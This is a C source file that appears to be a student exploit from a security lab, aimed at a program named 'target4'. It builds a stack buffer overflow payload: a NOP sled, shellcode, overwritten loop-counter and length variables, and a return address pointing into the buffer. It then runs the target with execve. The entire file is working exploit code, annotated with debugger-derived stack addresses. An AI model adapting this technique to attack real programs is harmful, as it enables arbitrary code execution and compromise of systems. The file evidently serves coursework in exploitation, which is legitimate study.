#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"



// rip in foo at 0x2021fea8
// in foo, buf at 0x2021fdf0, size 156
// diff = 184
// i at 0x2021fe98 (168 more than buf)
// len at 0x2021fe9c (172 more than buf), want len to be 188? so it reads to the end of the buffer?

#define BUFFLEN 189

int main(void)
{
  char *args[3];
  char *env[6];


	char buff[BUFFLEN];
	int i;
	for (i = 0; i < BUFFLEN; i++){
		buff[i] = 0x90;
	}

	for (i = 0; i < strlen(shellcode); i++){
		buff[i] = shellcode[i];
	}


  //b and a are chars, access to single byte
  int* loc_i = (int*)&buff[168];
	*loc_i = 0x000000A4; 

  int* loc_len = (int*)&buff[172];
	*loc_len = 0x000000B8; // 188 - 4 because i reset the i value to 164, so it traverses 164-168 again

	int* loc = (int*)&buff[BUFFLEN - 5];
	*loc = 0x2021fdf0; 

	int* end = (int*)&buff[BUFFLEN - 1];
	*end = '\0'; 



  args[0] = TARGET; args[1] = buff; args[2] = NULL;
  //env[0] = NULL;
  // env[0] = &buff[168];
  // env[1] = &buff[169];
  env[0] = &buff[170];   
  env[1] = &buff[171];
  env[2] = &buff[172];
  env[3] = &buff[174]; 
  env[4] = &buff[175];
  env[5] = &buff[176];
  
  
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
